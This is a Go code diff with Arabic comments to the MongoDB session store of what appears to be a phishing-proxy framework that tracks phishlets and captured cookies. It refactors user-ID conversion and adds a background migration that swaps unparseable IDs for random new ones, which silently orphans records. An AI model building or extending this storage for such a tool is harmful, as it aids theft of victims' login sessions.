@@ -101,20 +101,48 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	// عد عدد الجلسات الموجود
 	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
 	background := context.Background()
-
-	return &MongoDatabase{
+	
+	mongoDB := &MongoDatabase{
 		client:       client,
 		db:           db,
 		sessionsColl: sessionsColl,
 		ctx:          background,
 		cancel:       cancel,
-	}, nil
+	}
+	
+	// التحقق من تخزين UserId كـ ObjectID وترحيل الجلسات القديمة
+	go func() {
+		// ننتظر لحظة قبل التنفيذ
+		time.Sleep(1 * time.Second)
+		
+		// تحقق من تخزين UserId
+		mongoDB.VerifyObjectIdStorage()
+		
+		// ترحيل الجلسات القديمة
+		mongoDB.MigrateAllSessionsToObjectID()
+	}()
+
+	return mongoDB, nil
 }
 
 // Close يغلق اتصال قاعدة البيانات
 func (m *MongoDatabase) Close() error {
 	defer m.cancel()
 	return m.client.Disconnect(m.ctx)
+}
+
+// stringToObjectID تحويل النص إلى ObjectID
+func stringToObjectID(idStr string) primitive.ObjectID {
+	// التحقق من أن المعرف له طول صحيح
+	if len(idStr) == 24 {
+		objID, err := primitive.ObjectIDFromHex(idStr)
+		if err == nil {
+			return objID
+		}
+	}
+	// إذا فشل التحويل أو الطول غير صحيح، إنشاء معرف جديد
+	log.Warning("[MongoDB] فشل تحويل UserId من نص إلى ObjectID، إنشاء معرف جديد")
+	return primitive.NewObjectID()
 }
 
 // convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
@@ -142,18 +170,7 @@ func convertToMongoSession(s *Session) *MongoSession {
 	}
 	
 	// تحويل معرف المستخدم إلى ObjectID
-	var userId primitive.ObjectID
-	if len(s.UserId) == 24 {
-		var err error
-		userId, err = primitive.ObjectIDFromHex(s.UserId)
-		if err != nil {
-			// إذا فشل التحويل، ننشئ معرفًا جديدًا
-			userId = primitive.NewObjectID()
-		}
-	} else {
-		// إذا لم يكن المعرف صالحًا، ننشئ معرفًا جديدًا
-		userId = primitive.NewObjectID()
-	}
+	userId := stringToObjectID(s.UserId)
 
 	mongoSession := &MongoSession{
 		Id:           s.Id,
@@ -320,22 +337,8 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
     
 	// تحويل معرف المستخدم إلى ObjectID
 	userIdStr := GetUserId()
-	var userId primitive.ObjectID
-	var objIDErr error
-	
-	if len(userIdStr) == 24 {
-		// إذا كان المعرف صالحًا (24 حرف)، نحاول تحويله
-		userId, objIDErr = primitive.ObjectIDFromHex(userIdStr)
-		if objIDErr != nil {
-			// إذا فشل التحويل، ننشئ معرفًا جديدًا
-			userId = primitive.NewObjectID()
-			log.Warning("[MongoDB] فشل تحويل معرف المستخدم، تم إنشاء معرف جديد: %v", objIDErr)
-		}
-	} else {
-		// إذا لم يكن المعرف صالحًا، ننشئ معرفًا جديدًا
-		userId = primitive.NewObjectID()
-		log.Warning("[MongoDB] معرف المستخدم ليس بالتنسيق الصحيح، تم إنشاء معرف جديد")
-	}
+	userId := stringToObjectID(userIdStr)
+	log.Debug("[MongoDB] تحويل user_id من %s إلى ObjectID %s", userIdStr, userId.Hex())
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -364,6 +367,9 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	if err != nil {
 		return err
 	}
+	
+	// تأكيد من النوع بعد الإنشاء
+	m.ShowSessionDataInMongoDB(sid)
 	
 	return nil
 }
@@ -430,9 +436,15 @@ func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
 	var rawDocument bson.M
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
 	if err != nil {
-			return
+		return
 	}
 	
+	// طباعة معلومات عن نوع user_id
+	if userId, ok := rawDocument["user_id"]; ok {
+		userIdType := fmt.Sprintf("%T", userId)
+		userIdValue := fmt.Sprintf("%v", userId)
+		log.Debug("[MongoDB] نوع user_id في MongoDB: %s، القيمة: %s", userIdType, userIdValue)
+	}
 }
 
 // UpdateSession يحدث جلسة في MongoDB
@@ -703,5 +715,109 @@ func (m *MongoDatabase) SetSessionCookies(sid string, cookies []map[string]inter
 	}
 	
 	log.Success("[MongoDB] تم تحديث قائمة الكوكيز المعالجة بنجاح للجلسة: %s", sid)
+	return nil
+}
+
+// VerifyObjectIdStorage يتحقق من تخزين معرف المستخدم كـ ObjectID
+func (m *MongoDatabase) VerifyObjectIdStorage() error {
+	log.Info("[MongoDB] التحقق من تخزين UserId كـ ObjectID في MongoDB...")
+
+	// جلب كل الجلسات
+	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
+	if err != nil {
+		return err
+	}
+	defer cursor.Close(m.ctx)
+
+	// تحقق من كل جلسة
+	var session bson.M
+	count := 0
+	invalidCount := 0
+	
+	for cursor.Next(m.ctx) {
+		err := cursor.Decode(&session)
+		if err != nil {
+			continue
+		}
+		
+		count++
+		
+		// تحقق من نوع user_id
+		if userId, ok := session["user_id"]; ok {
+			userIdType := fmt.Sprintf("%T", userId)
+			userIdValue := fmt.Sprintf("%v", userId)
+			
+			if userIdType == "primitive.ObjectID" {
+				log.Success("[MongoDB] الجلسة %v: user_id مخزن كـ ObjectID: %s", session["session_id"], userIdValue)
+			} else {
+				log.Error("[MongoDB] الجلسة %v: user_id ليس ObjectID! النوع: %s، القيمة: %s", 
+					session["session_id"], userIdType, userIdValue)
+				invalidCount++
+			}
+		} else {
+			log.Warning("[MongoDB] الجلسة %v: لا يحتوي على حقل user_id", session["session_id"])
+			invalidCount++
+		}
+	}
+	
+	log.Info("[MongoDB] التحقق اكتمل. %d جلسة تم فحصها، %d جلسة بها مشكلة في user_id", count, invalidCount)
+	
+	return nil
+}
+
+// إضافة دالة التحويل الجماعي للجلسات القديمة
+func (m *MongoDatabase) MigrateAllSessionsToObjectID() error {
+	log.Info("[MongoDB] تحويل جميع معرفات المستخدمين في MongoDB إلى ObjectID...")
+
+	// جلب كل الجلسات
+	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
+	if err != nil {
+		return err
+	}
+	defer cursor.Close(m.ctx)
+
+	// تحويل كل جلسة
+	count := 0
+	updatedCount := 0
+	
+	for cursor.Next(m.ctx) {
+		var session bson.M
+		err := cursor.Decode(&session)
+		if err != nil {
+			continue
+		}
+		
+		count++
+		sessionId, _ := session["session_id"].(string)
+		
+		// تحقق من نوع user_id
+		if userId, ok := session["user_id"]; ok {
+			userIdType := fmt.Sprintf("%T", userId)
+			
+			// إذا كان النوع ليس ObjectID بالفعل
+			if userIdType != "primitive.ObjectID" {
+				userIdStr := fmt.Sprintf("%v", userId)
+				objId := stringToObjectID(userIdStr)
+				
+				// تحديث الجلسة
+				_, err := m.sessionsColl.UpdateOne(
+					m.ctx,
+					bson.M{"session_id": sessionId},
+					bson.M{"$set": bson.M{"user_id": objId}},
+				)
+				
+				if err != nil {
+					log.Error("[MongoDB] فشل تحديث الجلسة %s: %v", sessionId, err)
+				} else {
+					log.Success("[MongoDB] تم تحويل user_id للجلسة %s من %s إلى ObjectID %s", 
+						sessionId, userIdStr, objId.Hex())
+					updatedCount++
+				}
+			}
+		}
+	}
+	
+	log.Info("[MongoDB] اكتمل التحويل. %d جلسة تم فحصها، %d جلسة تم تحديثها", count, updatedCount)
+	
 	return nil
 } 
